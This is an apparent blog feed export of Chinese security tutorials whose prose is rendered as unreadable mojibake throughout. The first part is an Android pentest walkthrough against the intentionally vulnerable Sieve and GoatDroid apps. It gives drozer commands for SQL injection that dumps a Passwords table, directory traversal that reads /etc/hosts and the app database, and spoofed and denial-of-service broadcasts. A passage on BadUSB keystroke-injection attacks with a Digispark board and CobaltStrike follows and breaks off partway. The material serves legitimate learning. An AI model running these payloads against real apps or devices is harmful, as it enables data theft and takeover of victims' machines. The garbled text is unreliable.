alt="image-20231013105351961"></p><p>è¿›ä¸€æ­¥åˆ©ç”¨</p><p>å•å¼•å·æŠ¥é”™</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŒå¼•å·å†…ä¸ºæ³¨å…¥çš„è¯­å¥</span></span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection <span class="string">&quot;&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013110430578.png" alt="image-20231013110430578"></p><p>æŸ¥è¯¢æ‰€æœ‰è¡¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection <span class="string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013110556263.png" alt="image-20231013110556263"></p><p>æŸ¥è¯¢Passwordsè¡¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection <span class="string">&quot;* FROM Passwords;--&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013110937259.png" alt="image-20231013110937259"></p><h4 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a><strong>ç›®å½•éå†</strong></h4><p>ç›®å½•éå†æ¼æ´æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013111123785.png" alt="image-20231013111123785"></p><p>åˆ©ç”¨ç›®å½•éå†è¯»å–æ–‡ä»¶</p><p><code>/etc/hosts</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013111241044.png" alt="image-20231013111241044"></p><p><code>åº”ç”¨dbæ–‡ä»¶</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db</span><br></pre></td></tr></table></figure><p>ä¸‹è½½æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db C:/Users/Khaz/Desktop/database.db</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013111914892.png" alt="image-20231013111914892"></p><h3 id="Broadcast-Receiver"><a href="#Broadcast-Receiver" class="headerlink" title="Broadcast Receiver"></a>Broadcast Receiver</h3><table><thead><tr><th align="center">æ¼ æ´ç§ç±»</th><th align="center">å±å®³</th></tr></thead><tbody><tr><td align="center">æ•æ„Ÿä¿¡æ¯æ³„éœ²</td><td align="center">å‘é€çš„intentæ²¡æœ‰æ˜ç¡®æŒ‡å®šæ¥æ”¶è€…ï¼Œè€Œæ˜¯ç®€å•çš„é€šè¿‡actionè¿›è¡ŒåŒ¹é…ï¼Œæ¶æ„åº”ç”¨ä¾¿å¯ä»¥æ³¨å†Œä¸€ä¸ªå¹¿æ’­æ¥æ”¶è€…å—…æ¢æ‹¦æˆªåˆ°è¿™ä¸ªå¹¿æ’­ï¼Œå¦‚æœè¿™ä¸ªå¹¿æ’­å­˜åœ¨æ•æ„Ÿæ•°æ®ï¼Œå°±è¢«æ¶æ„åº”ç”¨çªƒå–äº†ã€‚</td></tr><tr><td align="center">æƒé™ç»•è¿‡</td><td align="center">å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ³¨å†Œå¹¿æ’­æ¥æ”¶å™¨ï¼Œä¸€ç§æ˜¯åœ¨AndroidManifest.xmlæ–‡ä»¶ä¸­é€šè¿‡<receiver>æ ‡ç­¾é™æ€æ³¨å†Œï¼Œå¦ä¸€ç§æ˜¯é€šè¿‡Context.registerReceiver()åŠ¨æ€æ³¨å†Œï¼ŒæŒ‡å®šç›¸åº”çš„intentFilterå‚æ•°ï¼ŒåŠ¨æ€æ³¨å†Œçš„å¹¿æ’­é»˜è®¤éƒ½æ˜¯å¯¼å‡ºçš„ï¼Œå¦‚æœå¯¼å‡ºçš„BroadcastReceiveræ²¡æœ‰åšæƒé™æ§åˆ¶ï¼Œå¯¼è‡´BroadcastReceiverç»„ä»¶å¯ä»¥æ¥æ”¶ä¸€ä¸ªå¤–éƒ¨å¯æ§çš„urlã€æˆ–è€…å…¶ä»–å‘½ä»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¶Šæƒåˆ©ç”¨åº”ç”¨çš„ä¸€äº›ç‰¹å®šåŠŸèƒ½ï¼Œæ¯”å¦‚å‘é€æ¶æ„å¹¿æ’­ã€ä¼ªé€ æ¶ˆæ¯ã€ä»»æ„åº”ç”¨ä¸‹è½½å®‰è£…ã€æ‰“å¼€é’“é±¼ç½‘ç«™ç­‰</receiver></td></tr><tr><td align="center">æ¶ˆæ¯ä¼ªé€ </td><td align="center">æš´éœ²çš„Receiverå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Receiveræ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£</td></tr><tr><td align="center">æ‹’ç»æœåŠ¡</td><td align="center">å¦‚æœæ•æ„Ÿçš„BroadcastReceiveræ²¡æœ‰è®¾ç½®ç›¸åº”çš„æƒé™ä¿æŠ¤ï¼Œå¾ˆå®¹æ˜“å—åˆ°æ”»å‡»ã€‚æœ€å¸¸è§çš„æ˜¯æ‹’ç»æœåŠ¡æ”»å‡»ã€‚æ‹’ç»æœåŠ¡æ”»å‡»æŒ‡çš„æ˜¯ï¼Œä¼ é€’æ¶æ„ç•¸å½¢çš„intentæ•°æ®ç»™å¹¿æ’­æ¥æ”¶å™¨ï¼Œå¹¿æ’­æ¥æ”¶å™¨æ— æ³•å¤„ç†å¼‚å¸¸å¯¼è‡´crashã€‚ æ‹’ç»æœåŠ¡æ”»å‡»çš„å±å®³è§†å…·ä½“ä¸šåŠ¡åœºæ™¯è€Œå®šï¼Œæ¯”å¦‚ä¸€ä¸ªå®‰å…¨é˜²æŠ¤äº§å“çš„æ‹’ç»æœåŠ¡ã€é”å±åº”ç”¨çš„æ‹’ç»æœåŠ¡ã€æ”¯ä»˜è¿›ç¨‹çš„æ‹’ç»æœåŠ¡ç­‰å±å®³å°±æ˜¯å·¨å¤§çš„ã€‚</td></tr></tbody></table><h4 id="æŸ¥çœ‹å¯å¯¼å‡ºç»„ä»¶-broadcast"><a href="#æŸ¥çœ‹å¯å¯¼å‡ºç»„ä»¶-broadcast" class="headerlink" title="æŸ¥çœ‹å¯å¯¼å‡ºç»„ä»¶ broadcast"></a>æŸ¥çœ‹å¯å¯¼å‡ºç»„ä»¶ broadcast</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013112655673.png" alt="image-20231013112655673"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver</span><br></pre></td></tr></table></figure><h4 id="æ‰¾åˆ°å¯¹åº”å¹¿æ’­"><a href="#æ‰¾åˆ°å¯¹åº”å¹¿æ’­" class="headerlink" title="æ‰¾åˆ°å¯¹åº”å¹¿æ’­"></a>æ‰¾åˆ°å¯¹åº”å¹¿æ’­</h4><p><img src="/../images/image-20231013113616161.png" alt="image-20231013113616161"></p><h4 id="æ¶ˆæ¯ä¼ªé€ "><a href="#æ¶ˆæ¯ä¼ªé€ " class="headerlink" title="æ¶ˆæ¯ä¼ªé€ "></a>æ¶ˆæ¯ä¼ªé€ </h4><p>ä½¿ç”¨jadxåç¼–è¯‘æ‰¾åˆ°å¯¹åº”çš„æºç ä¿¡æ¯ï¼Œå‘ç°éœ€è¦ä¸¤ä¸ªå‚æ•° phoneNumberã€message</p><p><img src="/../images/image-20231013113543266.png" alt="image-20231013113543266"></p><p>å‘é€æ¶æ„å¹¿æ’­</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 12345 --extra string message khaz</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013114022116.png" alt="image-20231013114022116"></p><h4 id="æ‹’ç»æœåŠ¡"><a href="#æ‹’ç»æœåŠ¡" class="headerlink" title="æ‹’ç»æœåŠ¡"></a>æ‹’ç»æœåŠ¡</h4><p>å‘é€ä¸å®Œæ•´çš„å¹¿æ’­</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013114122332.png" alt="image-20231013114122332"></p><h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><table><thead><tr><th align="center">æ¼æ´ç§ç±»</th><th align="center">å±å®³</th></tr></thead><tbody><tr><td align="center">æƒé™æå‡</td><td align="center">å½“ä¸€ä¸ªserviceé…ç½®äº†intent<code>-</code>filteré»˜è®¤æ˜¯è¢«å¯¼å‡ºçš„ï¼Œå¦‚æœæ²¡å¯¹è°ƒç”¨Serviceè¿›è¡Œæƒé™ï¼Œé™åˆ¶æˆ–è€…æ˜¯æ²¡æœ‰å¯¹è°ƒç”¨è€…çš„èº«ä»½è¿›è¡Œæœ‰æ•ˆéªŒè¯ï¼Œé‚£ä¹ˆæ¶æ„æ„é€ çš„APPéƒ½å¯ä»¥å¯¹æ­¤Serviceä¼ å…¥æ°å½“çš„å‚æ•°è¿›è¡Œè°ƒç”¨ï¼Œå¯¼è‡´æ¶æ„è¡Œä¸ºå‘ç”Ÿæ¯”å¦‚è°ƒç”¨å…·æœ‰systemæƒé™çš„åˆ é™¤å¸è½½æœåŠ¡åˆ é™¤å¸è½½å…¶ä»–åº”ç”¨ã€‚</td></tr><tr><td align="center">serviceåŠ«æŒ</td><td align="center">éšå¼å¯åŠ¨services,å½“å­˜åœ¨åŒåservices,å…ˆå®‰è£…åº”ç”¨çš„servicesä¼˜å…ˆçº§é«˜</td></tr><tr><td align="center">æ¶ˆæ¯ä¼ªé€ </td><td align="center">æš´éœ²çš„Serviceå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Serviceæ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£</td></tr><tr><td align="center">æ‹’ç»æœåŠ¡</td><td align="center">Serviceçš„æ‹’ç»æœåŠ¡ä¸»è¦æ¥æºäºServiceå¯åŠ¨æ—¶å¯¹æ¥æ”¶çš„Intentç­‰æ²¡æœ‰åšå¼‚å¸¸æƒ…å†µä¸‹çš„å¤„ç†ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒ</td></tr></tbody></table><h4 id="è·å–å¯å¯¼å‡ºæœåŠ¡"><a href="#è·å–å¯å¯¼å‡ºæœåŠ¡" class="headerlink" title="è·å–å¯å¯¼å‡ºæœåŠ¡"></a><strong>è·å–å¯å¯¼å‡ºæœåŠ¡</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run app.service.info -a &lt;packagename&gt;</span></span><br><span class="line">dz&gt; run app.service.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.AuthService</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.CryptoService</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure><h1 id="å…¶ä»–æµ‹è¯•å§¿åŠ¿"><a href="#å…¶ä»–æµ‹è¯•å§¿åŠ¿" class="headerlink" title="å…¶ä»–æµ‹è¯•å§¿åŠ¿"></a>å…¶ä»–æµ‹è¯•å§¿åŠ¿</h1><ul><li>é€šè¿‡æ›´æ”¹æ‰‹æœºçš„å‹å·æ¥é‡ç½®APPä¸­çš„ä½“éªŒæ¬¡æ•°</li><li></li></ul><h1 id="å…¶ä»–å·¥å…·"><a href="#å…¶ä»–å·¥å…·" class="headerlink" title="å…¶ä»–å·¥å…·"></a>å…¶ä»–å·¥å…·</h1><p><strong>APPæ¨¡æ‹Ÿå™¨</strong></p><ul><li>å¤œç¥æ¨¡æ‹Ÿå™¨&gt;7.0.2ï¼ˆXPosedæ¡†æ¶è¦æ±‚ï¼‰</li></ul><p><strong>åç¼–è¯‘</strong></p><ul><li>jadx-gui</li><li><a href="http://www.gda.wiki:9090/">GDAä¸»é¡µ-äºšæ´²é¦–æ¬¾äº¤äº’å¼Androidåç¼–è¯‘å™¨</a></li></ul><p><strong>APKç­¾å</strong></p><ul><li><p>GetAPKInfoï¼ˆéªŒç­¾ï¼‰</p></li><li><p>apktoolï¼ˆæ‰“åŒ…&#x2F;è§£åŒ…ï¼‰</p></li><li><p>signapkï¼ˆç­¾åï¼‰</p></li></ul><p><strong>APKæ¼æ‰«</strong></p><ul><li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a></li><li><a href="https://mogua.co/">æ‘¸ç“œ-æŸ¥è¯ˆéª—APP<em>æŸ¥ç—…æ¯’APP</em>å…è´¹APKåç¼–è¯‘åˆ†æå·¥å…· (mogua.co)</a></li></ul><p><strong>å…¶ä»–å°å·¥å…·</strong></p><ul><li><p><a href="https://github.com/kelvinBen/AppInfoScanner">AppInfoScanner</a></p><blockquote><p>å‰ææ¡ä»¶æ˜¯è„±äº†å£³</p></blockquote><p>ä¸€æ¬¾é€‚ç”¨äºä»¥HWè¡ŒåŠ¨&#x2F;çº¢é˜Ÿ&#x2F;æ¸—é€æµ‹è¯•å›¢é˜Ÿä¸ºåœºæ™¯çš„ç§»åŠ¨ç«¯(Androidã€iOSã€WEBã€H5ã€é™æ€ç½‘ç«™)ä¿¡æ¯æ”¶é›†æ‰«æå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆã€æ”»å‡»é˜Ÿæˆå‘˜ã€çº¢é˜Ÿæˆå‘˜å¿«é€Ÿæ”¶é›†åˆ°ç§»åŠ¨ç«¯æˆ–è€…é™æ€WEBç«™ç‚¹ä¸­å…³é”®çš„èµ„äº§ä¿¡æ¯å¹¶æä¾›åŸºæœ¬çš„ä¿¡æ¯è¾“å‡º,å¦‚ï¼šTitleã€Domainã€CDNã€æŒ‡çº¹ä¿¡æ¯ã€çŠ¶æ€ä¿¡æ¯ç­‰ã€‚</p></li><li><p><a href="https://github.com/sulab999/AppMessenger">sulab999&#x2F;AppMessenger: ä¸€æ¬¾é€‚ç”¨äºä»¥APPç—…æ¯’åˆ†æã€APPæ¼æ´æŒ–æ˜ã€APPå¼€å‘ã€HWè¡ŒåŠ¨&#x2F;çº¢é˜Ÿ&#x2F;æ¸—é€æµ‹è¯•å›¢é˜Ÿä¸ºåœºæ™¯çš„ç§»åŠ¨ç«¯(Androidã€iOS)è¾…åŠ©åˆ†æå·¥å…·</a></p><p><img src="/../images/image-20231013135314599.png" alt="image-20231013135314599"></p></li></ul><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p>Appå®‰å…¨æ£€æµ‹æŒ‡å—</p><p>[<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android%20APP%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.html]">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android%20APP%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.html]</a>(<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android">https://blog.gm7.org/ä¸ªäººçŸ¥è¯†åº“/04.ç§»åŠ¨å®‰å…¨/98.å¸¸è§„æµ‹è¯•æµç¨‹/01.Android</a> APPå¸¸è§„æµ‹è¯•æµç¨‹.html)</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NjUzNzg4Ng==&mid=2247483971&idx=1&sn=f4c726acbb472303b63c78bc442dddc8&chksm=ce481ab2f93f93a4cd3ba0cc1f66a6e98b25c6be28aacb19b0d228cb549967518d60da3858f3&cur_album_id=2988852703969787904&scene=189#wechat_redirect">Appé˜²æŠ“åŒ…æœ‰å››ç§ç»•è¿‡æ–¹æ³•ï¼ˆè¯¦ç»†ï¼‰</a></p><p><a href="https://zhuanlan.zhihu.com/p/36538699">å¦‚ä½•ä½¿ç”¨Xposed+JustTrustMeæ¥çªç ´SSL Pinning - çŸ¥ä¹</a></p><p><a href="https://developer.android.com/studio/command-line/adb.html?hl=zh-cn#pm">Android è°ƒè¯•æ¡¥ (adb)  | Android å¼€å‘è€…  | Android Developers</a></p><p>æ¨èï¼š<a href="https://github.com/WindXaa/Android-Vulnerability-Mining">WindXaa&#x2F;Android-Vulnerability-Mining: Android APPæ¼æ´ä¹‹æˆ˜ç³»åˆ—ï¼Œä¸»è¦è®²è¿°å¦‚ä½•å¿«é€ŸæŒ–æ˜APPæ¼æ´ (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è¿‘æºæ¸—é€ä¹‹BadUSB</title>
      <link href="/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/"/>
      <url>/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p><strong>è¯ç”Ÿ</strong></p><p>åœ¨2014å¹´çš„BlackHatå¤§ä¼šä¸Šï¼Œä¿¡æ¯å®‰å…¨ä¸“å®¶å±•ç¤ºäº†ä¸€ç§æ–°çš„ç½‘ç»œå®‰å…¨å¨èƒï¼Œè¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºBadUSBï¼Œå®é™…ä¸Šæ˜¯HIDæ”»å‡»ï¼Œè¯¥æ¼æ´ç”±Karsten Nohlå’ŒJakob Lellå…±åŒå‘ç°ã€‚</p><p><strong>HID</strong></p><p>HIDæ˜¯â€Human Interface Deviceâ€çš„ç¼©å†™ï¼Œä¸­æ–‡æ„ä¸ºâ€äººæœºæ¥å£è®¾å¤‡â€ã€‚HIDæ˜¯ä¸€ç§ç”¨äºè®¡ç®—æœºå’Œå…¶ä»–ç”µå­è®¾å¤‡ä¹‹é—´è¿›è¡Œäº¤äº’çš„æ ‡å‡†åŒ–åè®®å’Œæ¥å£ã€‚HIDåŒ…æ‹¬å¤šç§è¾“å…¥å’Œè¾“å‡ºè®¾å¤‡ï¼Œä¾‹å¦‚é”®ç›˜ã€é¼ æ ‡ã€æ¸¸æˆæ‰‹æŸ„ã€è§¦æ‘¸å±ã€æ‰«æä»ªç­‰ã€‚è¿™äº›è®¾å¤‡é€šè¿‡HIDåè®®ä¸è®¡ç®—æœºé€šä¿¡ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡è¿™äº›è®¾å¤‡ä¸è®¡ç®—æœºè¿›è¡Œäº¤äº’æ“ä½œã€‚</p><p><strong>HIDæ”»å‡»</strong></p><p>ä¸€èˆ¬æ¥è®²é’ˆå¯¹HIDçš„æ”»å‡»ä¸»è¦é›†ä¸­åœ¨é”®ç›˜é¼ æ ‡ä¸Šï¼Œå› ä¸ºåªè¦æ§åˆ¶äº†ç”¨æˆ·é”®ç›˜ï¼ŒåŸºæœ¬ä¸Šå°±ç­‰äºæ§åˆ¶äº†ç”¨æˆ·çš„ç”µè„‘ã€‚æ”»å‡»è€…ä¼šæŠŠæ”»å‡»éšè—åœ¨ä¸€ä¸ªæ­£å¸¸çš„é¼ æ ‡é”®ç›˜ä¸­ï¼Œå½“ç”¨æˆ·å°†<strong>å«æœ‰æ”»å‡»å‘é‡çš„é¼ æ ‡æˆ–é”®ç›˜æ’å…¥ç”µè„‘</strong>æ—¶ï¼Œ<strong>æ¶æ„ä»£ç ä¼šè¢«åŠ è½½å¹¶æ‰§è¡Œ</strong>ã€‚</p><p><strong>BadUsbçš„ç»“æ„</strong></p><p>BadUsbçš„å†…éƒ¨ç»“æ„å¦‚ä¸‹</p><p><img src="/../images/942cb02d-5333-4938-85ac-973f4c867ef4.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼ŒUç›˜å¤§è‡´ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†æ˜¯èŠ¯ç‰‡å¼•å¯¼ç¨‹åºï¼Œä¸€éƒ¨åˆ†æ˜¯é—ªå­˜åŒºåŸŸã€‚</p><p>æ§åˆ¶å™¨è´Ÿè´£ä¸PCçš„é€šè®¯å’Œè¯†åˆ«ï¼Œé—ªå­˜ç”¨æ¥åšæ•°æ®å­˜å‚¨ï¼›</p><p>é—ªå­˜ä¸­æœ‰ä¸€éƒ¨åˆ†åŒºåŸŸç”¨æ¥å­˜æ”¾Uç›˜çš„å›ºä»¶ï¼Œå®ƒçš„ä½œç”¨ç±»ä¼¼äºæ“ä½œç³»ç»Ÿï¼Œæ§åˆ¶è½¯ç¡¬ä»¶äº¤äº’ï¼›</p><p><strong>BadUsbæ”»å‡»</strong></p><p>BadUsbçš„æ”»å‡»ä¸HIDæ”»å‡»ç±»ä¼¼ï¼Œä¹Ÿæ˜¯æ’å…¥ç”µè„‘ååŠ è½½å¹¶æ‰§è¡Œæ¶æ„ä»£ç ä»è€Œå®Œæˆæ”»å‡»ã€‚</p><p>BadUsbæ’å…¥PCåï¼Œä¼šæ¨¡æ‹Ÿå‡ºä¸€ä¸ªè™šæ‹Ÿé”®ç›˜ï¼ŒåŒæ—¶æ‰§è¡Œæˆ‘ä»¬äº‹å…ˆå†™å…¥åˆ°å›ºä»¶ä¸­çš„ä»£ç æ¥æ•²å‡»ç›¸åº”çš„æŒ‰é”®ï¼Œè¾“å…¥æ”»å‡»ä»£ç ä»è€Œå®Œæˆä¸€äº›æ¶æ„è¡Œä¸ºã€‚</p><p><strong>BadUsbä¼˜åŠ¿</strong></p><ul><li>åªéœ€è¦ä½¿ç”¨é€šç”¨çš„USBè®¾å¤‡ï¼ˆæ¯”å¦‚Uç›˜ï¼‰å°±å¯ä»¥å®ŒæˆHIDæ”»å‡»ã€‚</li><li>æ¶æ„ä»£ç çƒ§å½•åˆ°å›ºä»¶ä¸­ï¼Œè€Œè¿™éƒ¨åˆ†åŒºåŸŸæ˜¯æ€æ¯’è½¯ä»¶æ— æ³•è®¿é—®çš„åŒºåŸŸï¼Œå› æ­¤å¤§éƒ¨åˆ†æ€æ¯’è½¯ä»¶æ˜¯æ ¹æœ¬æ— æ³•åº”å¯¹BadUsbæ”»å‡»çš„</li></ul><p><strong>å¸¸è§æ”»å‡»åœºæ™¯</strong></p><p>é»‘å®¢æ•…æ„å°†å†™å…¥äº†æ¶æ„ç¨‹åºçš„BadUsbä¸¢åœ¨æŸä¸ªåœºæ‰€é‡Œï¼Œå¦‚æœæœ‰äººå› ä¸ºå¥½å¥‡å¿ƒå°†BadUsbæ’å…¥ç”µè„‘ä¸­ï¼Œé‚£ä¹ˆå…¶ä¸­çš„æ¶æ„ç¨‹åºå°±ä¼šè¿è¡Œï¼Œé»‘å®¢ä»è€Œå¯ä»¥æ§åˆ¶è¿™ä¸ªäººçš„ç”µè„‘ã€‚æ¯”å¦‚æŠ¤ç½‘è¡ŒåŠ¨ï¼Œå¥½å¥‡çš„è“æ–¹äººå‘˜çš„ç”µè„‘è¢«çº¢æ–¹äººå‘˜ä»¥è¿™ç§æ–¹å¼æ§åˆ¶ğŸ˜¨ã€‚</p><h1 id="å·¥å…·å‡†å¤‡"><a href="#å·¥å…·å‡†å¤‡" class="headerlink" title="å·¥å…·å‡†å¤‡"></a>å·¥å…·å‡†å¤‡</h1><ul><li><p>æŸå®å¼€å‘æ¿ï¼ˆå…³é”®è¯digisparkï¼‰</p><p><img src="/../images/image-20231007114326582.png"></p></li><li><p>Ardunio IDE</p><p>ä¸‹è½½åœ°å€<a href="https://www.arduino.cc/en/software">https://www.arduino.cc/en/software</a></p><p>ä¸‹è½½å®Œåæ‰“å¼€Arduino IDEâ€“&gt;æ–‡ä»¶â€“&gt;é¦–é€‰é¡¹â€“&gt;é™„åŠ ç®¡ç†å™¨ç½‘å€ï¼š<a href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a></p><p><img src="/../images/image-20231007130123285.png" alt="image-20231007130123285"></p><p>å·¥å…·â€“&gt;å¼€å‘æ¿â€“&gt;å¼€å‘æ¿ç®¡ç†å™¨â€“&gt;å®‰è£…<code>Digistump AVR</code> è½¯ä»¶åŒ…</p><p><img src="/../images/image-20231007130250973.png" alt="image-20231007130250973"></p></li><li><p>Digisparké©±åŠ¨</p><p><a href="https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7">https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7</a></p></li><li><p>CobaltStrike</p></li></ul><h1 id="å¼€å‘æ¿è¿æ¥"><a href="#å¼€å‘æ¿è¿æ¥" class="headerlink" title="å¼€å‘æ¿è¿æ¥"></a>å¼€å‘æ¿è¿æ¥</h1><p>æ¿å­æˆåŠŸè¿æ¥ç”µè„‘åï¼Œå¯ä»¥åœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­çœ‹åˆ°</p><p><img src="/../images/image-20231007130836961.png" alt="image-20231007130836961"></p><p>é‡åˆ°ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œè¿™ç©æ„æ’ä¸Šå»æ²¡æœ‰æ˜¾ç¤ºç«¯å£ï¼ŒArdunioè¿æ¥ä¸äº†ï¼Œè€Œä¸”ä¸€ç›´é—ªçº¢ç¯ğŸ˜¢ã€‚</p><p>ç»è¿‡æœç´¢æ‰çŸ¥é“, è¿™å—æ¿å­æ¥ä¸Šç”µæºåªä¿æŒ <code>5s</code> çš„è¿æ¥, ç„¶åè‡ªåŠ¨è¿è¡Œæ¿å­å†…çš„ç¨‹åºã€‚</p><p>æ‰€ä»¥æ­£ç¡®çš„çƒ§å½•æ–¹å¼æ˜¯å…ˆç‚¹å‡»ä¸Šä¼ , ç­‰åˆ°ç»ˆç«¯æç¤ºæ¥å…¥è®¾å¤‡çš„æ—¶å€™, å†æ¥å…¥è®¾å¤‡çƒ§å½•ç¨‹åºã€‚</p><p><img src="/../images/image-20231007130725980.png" alt="image-20231007130725980"></p><h1 id="DigiKeyboard-hä½¿ç”¨"><a href="#DigiKeyboard-hä½¿ç”¨" class="headerlink" title="DigiKeyboard.hä½¿ç”¨"></a>DigiKeyboard.hä½¿ç”¨</h1><p>ä¸»è¦åˆ©ç”¨è¯¥åº“æ¥æ¨¡æ‹Ÿé”®ç›˜å’Œé¼ æ ‡è¾“å…¥</p><p>åœ¨githubä¸Šæ‰¾åˆ°äº†æ•°å­—æŒ‰é”®è¡¨</p><p><img src="/../images/68747470733a2f2f736372697074656c2e636f6d2f4b6579626f617264456d756c6174696f6e4150492f4a6176615363726970742f696d616765732f6b6579626f6172642d6964656e746966696572732e706e67" alt="KeyCodes"></p><p>é¢„è®¾å¸¸é‡</p><p><a href="https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h">https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h</a></p><p>å¸¸ç”¨å‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.println(<span class="string">&quot;text&quot;</span>); # ç”¨äºå‘æ¨¡æ‹Ÿé”®ç›˜å‘é€æ–‡æœ¬å¹¶åœ¨è®¡ç®—æœºä¸Šè¾“å…¥ä¸€è¡Œå­—ç¬¦å¹¶è‡ªåŠ¨åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå›è½¦ç¬¦</span><br><span class="line"></span><br><span class="line">DigiKeyboard.sendKeyStroke(key); # ç”¨äºæ¨¡æ‹ŸæŒ‰ä¸‹å’Œé‡Šæ”¾ä¸€ä¸ªæŒ‡å®šçš„æŒ‰é”®</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(ms) # 